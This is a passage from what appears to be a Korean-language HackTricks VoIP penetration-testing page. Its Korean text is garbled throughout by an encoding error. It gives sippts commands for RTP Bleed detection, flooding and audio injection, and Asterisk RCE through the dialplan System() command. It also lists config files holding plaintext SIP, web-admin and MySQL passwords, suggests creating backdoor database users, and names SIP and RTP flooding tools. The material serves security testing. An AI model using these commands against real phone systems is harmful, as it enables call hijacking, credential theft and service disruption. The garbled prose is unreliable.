ë˜ ë‹¤ë¥¸ í¥ë¯¸ë¡œìš´ RTP í”„ë¡ì‹œ ë° RTP ìŠ¤íƒì˜ ë™ì‘ì€ ë•Œë¡œëŠ” **RTP Bleedì— ì·¨ì•½í•˜ì§€ ì•Šë”ë¼ë„** **ì–´ë– í•œ ì†ŒìŠ¤ì—ì„œë„ RTP íŒ¨í‚·ì„ ìˆ˜ë½, ì „ë‹¬ ë°/ë˜ëŠ” ì²˜ë¦¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” í•©ë²•ì ì¸ ê²ƒ ëŒ€ì‹  ìì‹ ì˜ ë¯¸ë””ì–´ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆëŠ” RTP íŒ¨í‚·ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì´ ê³µê²©ì„ RTP ì‚½ì…ì´ë¼ê³  ë¶€ë¥´ë©°, ì´ëŠ” ì¡´ì¬í•˜ëŠ” RTP ìŠ¤íŠ¸ë¦¼ì— ë¶€ì •í•œ RTP íŒ¨í‚·ì„ ì‚½ì…í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ RTP í”„ë¡ì‹œ ë° ì—”ë“œí¬ì¸íŠ¸ì—ì„œ ë°œê²¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Asteriskì™€ FreePBXëŠ” ì „í†µì ìœ¼ë¡œ **`NAT=yes` ì„¤ì •**ì„ ì‚¬ìš©í–ˆìœ¼ë©°, ì´ëŠ” RTP íŠ¸ë˜í”½ì´ ì¸ì¦ì„ ìš°íšŒí•˜ë„ë¡ í—ˆìš©í•˜ì—¬ í†µí™” ì‹œ ì˜¤ë””ì˜¤ê°€ ì—†ê±°ë‚˜ ì¼ë°©ì ì¸ ì˜¤ë””ì˜¤ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [https://www.rtpbleed.com/](https://www.rtpbleed.com/)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedëŠ” RTP Bleed ì·¨ì•½ì ì„ ê°ì§€í•˜ì—¬ RTP ìŠ¤íŠ¸ë¦¼ì„ ë³´ëƒ…ë‹ˆë‹¤.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ:** SIPPTS rtcpbleedëŠ” RTCP ìŠ¤íŠ¸ë¦¼ì„ ë³´ë‚´ RTP Bleed ì·¨ì•½ì ì„ ê°ì§€í•©ë‹ˆë‹¤.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ:** SIPPTS rtpbleedfloodëŠ” RTP ìŠ¤íŠ¸ë¦¼ì„ ì „ì†¡í•˜ì—¬ RTP Bleed ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ:** SIPPTS rtpbleedinjectëŠ” RTP Bleed ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ì˜¤ë””ì˜¤ íŒŒì¼ (WAV í˜•ì‹)ì„ ì‚½ì…í•©ë‹ˆë‹¤.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskì—ì„œ ì–´ë–»ê²Œë“  **extension ê·œì¹™ì„ ì¶”ê°€í•˜ê³  ë‹¤ì‹œë¡œë“œ**í•  ìˆ˜ ìˆë‹¤ë©´(ì˜ˆ: ì·¨ì•½í•œ ì›¹ ë§¤ë‹ˆì € ì„œë²„ë¥¼ ì¹¨íˆ¬í•¨ìœ¼ë¡œì¨), **`System`** ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**ì´ë¼ëŠ” ëª…ë ¹ì–´ëŠ” í•„ìš”ì— ë”°ë¼ ì‹œìŠ¤í…œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” **`System`** ëŒ€ì‹  ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì„œë²„ê°€ **`System`** ëª…ë ¹ì–´ì—ì„œ íŠ¹ì • ë¬¸ìì˜ ì‚¬ìš©ì„ ê¸ˆì§€í•˜ê³  ìˆëŠ” ê²½ìš° (ì˜ˆ: Elastix), ì›¹ ì„œë²„ê°€ ì‹œìŠ¤í…œ ë‚´ì—ì„œ **íŒŒì¼ì„ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œë“  ìƒì„±í•˜ëŠ” ê²ƒì„ í—ˆìš©í•˜ëŠ”ì§€** í™•ì¸í•˜ê³  (ì˜ˆ: Elastix ë˜ëŠ” trixbox), ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë°±ë„ì–´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±**í•œ ë‹¤ìŒ **`System`**ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ **ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

#### í¥ë¯¸ë¡œìš´ ë¡œì»¬ íŒŒì¼ ë° ê¶Œí•œ

* **`sip.conf`** -> SIP ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **Asterisk ì„œë²„ê°€ rootë¡œ ì‹¤í–‰ ì¤‘ì¸ ê²½ìš°**, rootë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **mysql root ì‚¬ìš©ì**ëŠ” **ë¹„ë°€ë²ˆí˜¸ê°€ ì—†ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°±ë„ì–´ë¡œ ìƒˆë¡œìš´ mysql ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`FreePBX`**
* **`amportal.conf`** -> ì›¹ íŒ¨ë„ ê´€ë¦¬ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤ (FreePBX).
* **`FreePBX.conf`** -> ë°ì´í„°ë² ì´ìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” FreePBXuser ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°±ë„ì–´ë¡œ ìƒˆë¡œìš´ mysql ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root íŒ¨ìŠ¤ì›Œë“œ, IMAPd íŒ¨ìŠ¤ì›Œë“œ, ì›¹ ê´€ë¦¬ì íŒ¨ìŠ¤ì›Œë“œ ë“±ì„ í‰ë¬¸ìœ¼ë¡œ í¬í•¨í•©ë‹ˆë‹¤.
* **ì—¬ëŸ¬ í´ë”**ê°€ ì¹¨í•´ëœ asterisk ì‚¬ìš©ìì— ì†í•  ê²ƒì…ë‹ˆë‹¤ (rootë¡œ ì‹¤í–‰ ì¤‘ì´ ì•„ë‹Œ ê²½ìš°). ì´ ì‚¬ìš©ìëŠ” ì´ì „ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆê³  êµ¬ì„±ì„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ Asteriskê°€ ì‹¤í–‰ë  ë•Œ ë‹¤ë¥¸ ë°±ë„ì–´ ë°”ì´ë„ˆë¦¬ë¥¼ ë¡œë“œí•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### RTP ì‚½ì…

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ë° **`rtpmixsound`** (`sudo apt install rtpmixsound`)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”ì— **`.wav`**ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ” [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”ë¥¼ **ìŠ¤ìº”**í•˜ëŠ” (**`rtpscan.pl`**), ëŒ€í™”ì— `.wav`ë¥¼ ë³´ë‚´ëŠ” (**`rtpsend.pl`**) ë° ëŒ€í™”ì— **ì†ŒìŒì„ ì‚½ì…**í•˜ëŠ” (**`rtpflood.pl`**) ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

### DoS

VoIP ì„œë²„ì—ì„œ DoSë¥¼ ì‹œë„í•˜ëŠ” ì—¬ëŸ¬ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`SIPPTS flood`**: SIPPTS floodëŠ” ëŒ€ìƒì— ë¬´ì œí•œ ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤.
* `sippts flood -i 10.10.0.10 -m invite -v`
* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`SIPPTS ping`**: SIPPTS pingì€ ì„œë²„ ì‘ë‹µ ì‹œê°„ì„ í™•ì¸í•˜ê¸° ìœ„í•´ SIP í•‘ì„ ë³´ëƒ…ë‹ˆë‹¤.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asteriskì—ì„œ ì‚¬ìš©ë˜ëŠ” IAX í”„ë¡œí† ì½œì— ëŒ€í•œ DoS
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IPë¥¼ í†µí•´ SIP/SDP INVITE ë©”ì‹œì§€ë¥¼ í­ì£¼ì‹œí‚¤ëŠ” ë„êµ¬
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): ì—¬ëŸ¬ ê°œì˜ ì˜¬ë°”ë¥´ê²Œ í˜•ì„±ëœ RTP íŒ¨í‚·ì„ ë³´ëƒ…ë‹ˆë‹¤. ì‚¬ìš© ì¤‘ì¸ RTP í¬íŠ¸ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤ (ë¨¼ì € ìŠ¤ë‹ˆí•‘).
* [**SIPp**](https://github.com/SIPp/sipp): SIP íŠ¸ë˜í”½ì„ ë¶„ì„í•˜ê³  ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ DoSì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ìŠ¤ìœ„ìŠ¤ ì•„ë¯¸ ë‚˜ì´í”„. SIP ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ë°ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS ì·¨ì•½ì 

Asteriskì™€ ê°™ì€ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì„¤ì¹˜í•˜ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì€ ì´ë¯¸ ì„¤ì¹˜ëœ **OS ë°°í¬íŒ**ì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆ: **FreePBX, Elastix, Trixbox**... ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ì†Œí”„íŠ¸ì›¨ì–´ê°€ ì‘ë™í•˜ë©´ ì‹œìŠ¤í…œ ê´€ë¦¬ìê°€ ë‹¤ì‹œ **ì—…ë°ì´íŠ¸í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë©°** ì‹œê°„ì´ ì§€ë‚¨ì— ë”°ë¼ **ì·¨ì•½ì **ì´ ë°œê²¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜** **PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [ë””ìŠ¤ì½”ë“œ ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks ë° HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
